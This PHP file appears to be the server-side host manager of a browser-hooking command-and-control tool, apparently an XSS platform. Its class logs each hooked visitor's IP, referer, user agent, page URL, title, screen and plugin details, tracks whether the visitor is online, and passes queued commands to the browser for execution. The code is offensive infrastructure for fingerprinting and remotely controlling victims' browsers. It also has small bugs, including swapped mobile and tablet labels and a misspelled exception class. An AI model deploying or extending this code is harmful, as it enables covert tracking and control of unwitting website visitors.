<?php
/**
 * 主机操作类
 * @author ambulong
 *
 */
class pmxHost {
	private $dbh = NULL;
	private $id = NULL;
	private $sid = NULL;
	private $ip = NULL;
	private $time = NULL;
	private $location = NULL;
	private $HTTP_ACCEPT = NULL;
	private $HTTP_REFERER = NULL;
	private $HTTP_USER_AGENT = NULL;
	private $flash = NULL;
	private $java = NULL;
	private $screen = NULL;
	private $title = NULL;
	
	/**
	 * 初始化DBH
	 */
	public function __construct() {
		$this->dbh = $GLOBALS ['pmx_dbh'];
		$this->ip = get_ip ();
		$this->time = get_time ();
		$this->location = isset ( $_REQUEST ["location"] ) ? $_REQUEST ["location"] : "";
		$this->HTTP_ACCEPT = isset ( $_SERVER ["HTTP_ACCEPT"] ) ? $_SERVER ["HTTP_ACCEPT"] : "";
		$this->HTTP_REFERER = isset ( $_SERVER ["HTTP_REFERER"] ) ? $_SERVER ["HTTP_REFERER"] : "";
		$this->HTTP_USER_AGENT = isset ( $_SERVER ["HTTP_USER_AGENT"] ) ? $_SERVER ["HTTP_USER_AGENT"] : "";
		$this->flash = isset ( $_GET ['flash'] ) ? $_GET ['flash'] : "";
		$this->java = isset ( $_GET ['java'] ) ? $_GET ['java'] : "";
		$this->screen = isset ( $_GET ['screen'] ) ? $_GET ['screen'] : "";
		$this->title = isset ( $_GET ['title'] ) ? utf8_urldecode ( $_GET ['title'] ) : "";
	}
	
	/**
	 * 主机记录ID是否存在
	 * 
	 * @param int $id        	
	 * @return boolean
	 */
	public function isExistID($id) {
		$id = intval ( $id );
		global $table_prefix;
		try {
			$sth = $this->dbh->prepare ( "SELECT count(*) FROM {$table_prefix}hosts WHERE `id` = :id " );
			$sth->bindParam ( ':id', $id );
			$sth->execute ();
			$row = $sth->fetch ();
			if ($row [0] > 0) {
				return TRUE;
			} else {
				return FALSE;
			}
		} catch ( PDOExecption $e ) {
			echo "<br>Error: " . $e->getMessage ();
		}
	}
	
	/**
	 * 主机记录字符串ID是否存在
	 * 
	 * @param String $saltid
	 *        	要查询的字符串ID
	 * @return boolean
	 */
	public function isExistSaltID($saltid) {
		global $table_prefix;
		try {
			$sth = $this->dbh->prepare ( "SELECT count(*) FROM {$table_prefix}hosts WHERE `sid` = :saltid" );
			$sth->bindParam ( ':saltid', $saltid );
			$sth->execute ();
			$row = $sth->fetch ();
			if ($row [0] > 0) {
				return TRUE;
			} else {
				return FALSE;
			}
		} catch ( PDOExecption $e ) {
			echo "<br>Error: " . $e->getMessage ();
		}
	}
	
	/**
	 * 主机记录IP是否存在
	 * 
	 * @param String $ip
	 *        	要查询的IP地址
	 * @return boolean
	 */
	public function isExistIP($ip) {
		global $table_prefix;
		try {
			$sth = $this->dbh->prepare ( "SELECT count(*) FROM {$table_prefix}hosts WHERE `ip` = :ip" );
			$sth->bindParam ( ':ip', $ip );
			$sth->execute ();
			$row = $sth->fetch ();
			if ($row [0] > 0) {
				return TRUE;
			} else {
				return FALSE;
			}
		} catch ( PDOExecption $e ) {
			echo "<br>Error: " . $e->getMessage ();
		}
	}
	
	/**
	 * 添加主机
	 * 
	 * @param unknown $pid        	
	 * @param unknown $sid        	
	 * @return boolean
	 */
	public function addHost($pid, $sid) {
		global $table_prefix;
		if ($this->isExistSaltID ( $sid )) {
			return FALSE;
		}
		$ip = get_ip ();
		$time = get_time ();
		$status = 1;
		$device = $this->getDevice ();
		$lastestRequest = get_time ();
		try {
			$sth = $this->dbh->prepare ( "INSERT INTO {$table_prefix}hosts(`pid`,`sid`,`ip`,`device`,`status`,`firstRequest`,`lastestRequest`,`location`,`HTTP_REFERER`,`HTTP_USER_AGENT`,`HTTP_ACCEPT`,`flash`,`java`,`screen`,`title`) VALUES( :pid, :sid, :ip, :device, :status, :firstRequest, :lastestRequest, :location, :HTTP_REFERER, :HTTP_USER_AGENT, :HTTP_ACCEPT, :flash, :java, :screen, :title)" );
			$sth->bindParam ( ':pid', $pid );
			$sth->bindParam ( ':sid', $sid );
			$sth->bindParam ( ':ip', $ip );
			$sth->bindParam ( ':device', $device );
			$sth->bindParam ( ':location', $this->location );
			$sth->bindParam ( ':status', $status );
			$sth->bindParam ( ':firstRequest', $time );
			$sth->bindParam ( ':lastestRequest', $lastestRequest );
			$sth->bindParam ( ':location', $this->location );
			$sth->bindParam ( ':HTTP_REFERER', $this->HTTP_REFERER );
			$sth->bindParam ( ':HTTP_USER_AGENT', $this->HTTP_USER_AGENT );
			$sth->bindParam ( ':HTTP_ACCEPT', $this->HTTP_ACCEPT );
			$sth->bindParam ( ':flash', $this->flash );
			$sth->bindParam ( ':java', $this->java );
			$sth->bindParam ( ':screen', $this->screen );
			$sth->bindParam ( ':title', $this->title );
			$sth->execute ();
			if (! ($sth->rowCount () > 0)) {
				return FALSE;
			}
			$this->id = $this->dbh->lastInsertId ();
			return TRUE;
		} catch ( PDOExecption $e ) {
			echo "<br>Error: " . $e->getMessage ();
		}
	}
	
	/**
	 * 更新主机
	 * 
	 * @param unknown $pid        	
	 * @param unknown $sid        	
	 * @return boolean
	 */
	public function updateHost($sid) {
		global $table_prefix;
		if (! $this->isExistSaltID ( $sid )) {
			return FALSE;
		}
		$ip = get_ip ();
		$status = 1;
		$lastestRequest = get_time ();
		$device = $this->getDevice ();
		try {
			$sth = $this->dbh->prepare ( "UPDATE {$table_prefix}hosts SET `ip` = :ip, `device` = :device,`status` = :status,`lastestRequest` = :lastestRequest,`location` = :location,`HTTP_REFERER` = :HTTP_REFERER,`HTTP_USER_AGENT` = :HTTP_USER_AGENT,`HTTP_ACCEPT` = :HTTP_ACCEPT, `flash` = :flash, `java` = :java, `screen` = :screen, `title` = :title WHERE `sid` = :sid" );
			$sth->bindParam ( ':sid', $sid );
			$sth->bindParam ( ':ip', $ip );
			$sth->bindParam ( ':device', $device );
			$sth->bindParam ( ':location', $this->location );
			$sth->bindParam ( ':status', $status );
			$sth->bindParam ( ':lastestRequest', $lastestRequest );
			$sth->bindParam ( ':location', $this->location );
			$sth->bindParam ( ':HTTP_REFERER', $this->HTTP_REFERER );
			$sth->bindParam ( ':HTTP_USER_AGENT', $this->HTTP_USER_AGENT );
			$sth->bindParam ( ':HTTP_ACCEPT', $this->HTTP_ACCEPT );
			$sth->bindParam ( ':flash', $this->flash );
			$sth->bindParam ( ':java', $this->java );
			$sth->bindParam ( ':screen', $this->screen );
			$sth->bindParam ( ':title', $this->title );
			$sth->execute ();
			if (! ($sth->rowCount () > 0)) {
				return FALSE;
			}
			return TRUE;
		} catch ( PDOExecption $e ) {
			echo "<br>Error: " . $e->getMessage ();
		}
	}
	
	/**
	 * 更新主机状态
	 * 
	 * @param unknown $sid        	
	 * @return boolean
	 */
	public function updateStatus($sid) {
		global $table_prefix;
		if (! $this->isExistSaltID ( $sid )) {
			return FALSE;
		}
		$detail = $this->getDetail ( $sid );
		$time = get_time ();
		$lastestRequest = $detail ['lastestRequest'];
		$timeDiff = abs ( strtotime ( $time ) - strtotime ( $lastestRequest ) );
		try {
			$sth = $this->dbh->prepare ( "UPDATE {$table_prefix}hosts SET `status` = :status WHERE `sid` = :sid" );
			$status = 1;
			if ($timeDiff > 13) {
				$status = 0;
			}
			$sth->bindParam ( ':sid', $sid );
			$sth->bindParam ( ':status', $status );
			$sth->execute ();
			if (! ($sth->rowCount () > 0)) {
				return FALSE;
			}
			return TRUE;
		} catch ( PDOExecption $e ) {
			echo "<br>Error: " . $e->getMessage ();
		}
	}
	
	/**
	 * 获取主机详细内容
	 * 
	 * @param Int $sid
	 *        	项目字符串ID
	 * @return boolean|unknown
	 */
	public function getDetail($sid) {
		global $table_prefix;
		if (! $this->isExistSaltID ( $sid )) {
			return FALSE;
		}
		try {
			$sth = $this->dbh->prepare ( "SELECT * FROM {$table_prefix}hosts WHERE `sid` = :sid " );
			$sth->bindParam ( ':sid', $sid );
			$sth->execute ();
			$result = $sth->fetch ( PDO::FETCH_ASSOC );
			return $result;
		} catch ( PDOExecption $e ) {
			echo "<br>Error: " . $e->getMessage ();
		}
	}
	
	/**
	 * 获取主机详细内容
	 * 
	 * @param Int $sid
	 *        	项目ID
	 * @return boolean|unknown
	 */
	public function getDetailByID($id) {
		global $table_prefix;
		if (! $this->isExistID ( $id )) {
			return FALSE;
		}
		try {
			$sth = $this->dbh->prepare ( "SELECT * FROM {$table_prefix}hosts WHERE `id` = :id " );
			$sth->bindParam ( ':id', $id );
			$sth->execute ();
			$result = $sth->fetch ( PDO::FETCH_ASSOC );
			return $result;
		} catch ( PDOExecption $e ) {
			echo "<br>Error: " . $e->getMessage ();
		}
	}
	
	/**
	 * 获取未回应的记录
	 * 
	 * @param unknown $sid        	
	 * @return string
	 */
	public function getLogs($sid) {
		global $table_prefix;
		if (! $this->isExistSaltID ( $sid )) {
			return FALSE;
		}
		(new pmxHostLog ())->updateStatus (); // 更新记录状态
		try {
			$sth = $this->dbh->prepare ( "SELECT * FROM {$table_prefix}hostLogs WHERE `sid` = :sid AND resp = '' ORDER BY `id` DESC" );
			$sth->bindParam ( ':sid', $sid );
			$sth->execute ();
			$result = $sth->fetchALL ( PDO::FETCH_ASSOC );
			return $result;
		} catch ( PDOExecption $e ) {
			echo "<br>Error: " . $e->getMessage ();
		}
		return "";
	}
	
	/**
	 * 获取已执行的记录
	 * 
	 * @param unknown $sid        	
	 * @return string
	 */
	public function getExecutedLogs($sid) {
		global $table_prefix;
		if (! $this->isExistSaltID ( $sid )) {
			return FALSE;
		}
		(new pmxHostLog ())->updateStatus (); // 更新记录状态
		try {
			$sth = $this->dbh->prepare ( "SELECT * FROM {$table_prefix}hostLogs WHERE `sid` = :sid AND resp != '' ORDER BY `id` DESC" );
			$sth->bindParam ( ':sid', $sid );
			$sth->execute ();
			$result = $sth->fetchALL ( PDO::FETCH_ASSOC );
			return $result;
		} catch ( PDOExecption $e ) {
			echo "<br>Error: " . $e->getMessage ();
		}
		return "";
	}
	
	/**
	 * 获取主机代码
	 * 
	 * @param unknown $sid        	
	 * @return boolean
	 */
	public function getCommand($sid) {
		global $table_prefix;
		if (! $this->isExistSaltID ( $sid )) {
			return FALSE;
		}
		$hostlogs = $this->getLogs ( $sid );
		if (count ( $hostlogs ) > 0) {
			// var_dump($hostlogs);
			if (! (new pmxHostLog ())->addResp ( $hostlogs [0] ['saltid'], json_encode ( array (
					"status" => "executed" 
			) ) ))
				echo "//" . $hostlogs [0] ['saltid'] . "\n";
			return $hostlogs [0] ['command'];
		} else {
			return "";
		}
	}
	
	/**
	 * 生成随机字符串
	 * 
	 * @param int $length
	 *        	要生成的字符串长度
	 * @return string
	 */
	public function newSaltID($length = 8) {
		$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
		$salt = '';
		for($i = 0; $i < $length; $i ++) {
			$salt .= $chars [mt_rand ( 0, strlen ( $chars ) - 1 )];
		}
		return $salt;
	}
	
	/**
	 * 获取客户端操作设备
	 */
	public function getDevice() {
		$md = new Mobile_Detect ();
		if ($md->isTablet ()) {
			return "mobile";
		} elseif ($md->isMobile ()) {
			return "tablet";
		} else {
			return "computer";
		}
	}
	
	/**
	 * 删除主机(IP)
	 * 
	 * @param unknown $ip        	
	 * @return boolean|unknown
	 */
	public function delHostIP($ip) {
		global $table_prefix;
		if (! $this->isExistIP ( $ip )) {
			return FALSE;
		}
		try {
			$this->delLogsIP ( $ip );
			$sth = $this->dbh->prepare ( "DELETE FROM {$table_prefix}hosts WHERE `ip` = :ip" );
			$sth->bindParam ( ':ip', $ip );
			$sth->execute ();
			$row = $sth->rowCount ();
			if ($row > 0) {
				return $row;
			} else {
				return FALSE;
			}
		} catch ( PDOExecption $e ) {
			echo "<br>Error: " . $e->getMessage ();
		}
	}
	
	/**
	 * 删除主机记录(IP)
	 * 
	 * @param unknown $ip        	
	 * @return boolean|unknown
	 */
	public function delLogsIP($ip) {
		global $table_prefix;
		if (! $this->isExistIP ( $ip )) {
			return FALSE;
		}
		try {
			$sth = $this->dbh->prepare ( "DELETE FROM {$table_prefix}hostLogs WHERE `sid` IN (SELECT `sid` from {$table_prefix}hosts WHERE `ip` = :ip);" );
			$sth->bindParam ( ':ip', $ip );
			$sth->execute ();
			$row = $sth->rowCount ();
			if ($row > 0) {
				return $row;
			} else {
				return FALSE;
			}
		} catch ( PDOExecption $e ) {
			echo "<br>Error: " . $e->getMessage ();
		}
	}
	
	/**
	 * 删除不在线主机
	 * 
	 * @return boolean|unknown
	 */
	public function delHostOffline() {
		global $table_prefix;
		try {
			$this->delLogsOffline ();
			$sth = $this->dbh->prepare ( "DELETE FROM {$table_prefix}hosts WHERE `status` = 0" );
			$sth->execute ();
			$row = $sth->rowCount ();
			if ($row > 0) {
				return $row;
			} else {
				return FALSE;
			}
		} catch ( PDOExecption $e ) {
			echo "<br>Error: " . $e->getMessage ();
		}
	}
	
	/**
	 * 删除不在线主机记录
	 * 
	 * @return boolean|unknown
	 */
	public function delLogsOffline() {
		global $table_prefix;
		try {
			$sth = $this->dbh->prepare ( "DELETE FROM {$table_prefix}hostLogs WHERE `sid` IN (SELECT `sid` from {$table_prefix}hosts WHERE `status` = 0);" );
			$sth->execute ();
			$row = $sth->rowCount ();
			if ($row > 0) {
				return $row;
			} else {
				return FALSE;
			}
		} catch ( PDOExecption $e ) {
			echo "<br>Error: " . $e->getMessage ();
		}
	}
}